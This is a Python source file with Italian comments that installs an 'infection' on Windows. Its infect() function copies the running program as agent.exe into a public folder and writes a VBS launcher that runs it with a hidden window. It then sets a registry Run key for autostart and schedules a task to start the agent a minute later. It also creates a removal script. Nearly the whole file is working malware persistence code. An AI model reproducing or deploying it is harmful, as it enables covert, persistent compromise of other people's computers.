import subprocess
import datetime
import os

path = "C:\\Users\\Public\\Agent\\"		# Path infezione

a_name = "agent.exe"		# Nome agente
r_name = "run.vbs"			# Nome run file
i_name = "infect.bat"		# Nome script infezione
c_name = "deinfect.bat"		# Nome script per rimuovere l'infezione

ar_name = "AGENT"			# Nome label autorun

def infect (curr_name, keyword):

	if not os.path.exists(path):				# Se la directory non esiste, la crea
		os.makedirs(path)

	if not os.path.exists(path + a_name):		# Se l'agente non esiste lo copia
		proc = subprocess.Popen('copy "' + curr_name + '" "' + path + a_name + '"', bufsize=0, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
		stdout, stderr = proc.communicate()


	if not os.path.exists(path + r_name):		# Se il run file non esiste, lo crea
		f = open(path + r_name, 'w')
		f.write ('Set oShell = CreateObject ("Wscript.Shell")' + '\n')
		f.write ('Dim strArgs' + '\n')
		f.write ('strArgs = "' + path + a_name + ' ' + keyword + '"' + '\n')
		f.write ('oShell.Run strArgs, 0, false' + '\n')
		f.close ()


	if not os.path.exists(path + i_name):		# Se non esiste lo script infezione, lo crea
		f = open(path + i_name, 'w')
		f.write ('reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /f /v "' + ar_name + '" /t REG_SZ /d "' + path + r_name + '"')
		#f.write ('schtasks /create /SC ONLOGON /TN "' + ar_name + '" /TR "' + path + r_name + '" /F')
		f.close ()


	if not os.path.exists(path + c_name):		# Se non esiste lo script di rimozione, lo crea
		f = open(path + c_name, 'w')
		f.write ('reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /f /v "' + ar_name + '"' + '\n')
		#f.write ('schtasks /delete /TN "' + ar_name + '" /F')
		f.write ('taskkill /F /IM ' + a_name + '\n')
		f.write ('del /F "' + path + a_name + '"' + '\n')
		f.write ('del /F "' + path + r_name + '"' + '\n')
		f.write ('del /F "' + path + i_name + '"' + '\n')
		f.write ('del /F "' + path + c_name + '"' + '\n')
		f.write ('rmdir /Q /S "' + path + '"' + '\n')
		f.close ()

	# Esegue l'infezione (Imposta l'esecuzione del run file all'avvio)
	proc = subprocess.Popen(path + i_name, bufsize=0, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
	stdout, stderr = proc.communicate()

	# Viene impostata una operazione pianificata per lanciare l'agente fra 1 minuto
	t = datetime.datetime.now() + datetime.timedelta(minutes=1)
	run_time = "%d:%02d" % (t.hour, t.minute)

	proc = subprocess.Popen('schtasks /create /SC ONCE /TN "' + ar_name + '" /TR "' + path + r_name + '" /ST '+ str(run_time) + ' /F', bufsize=0, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
	stdout, stderr = proc.communicate()

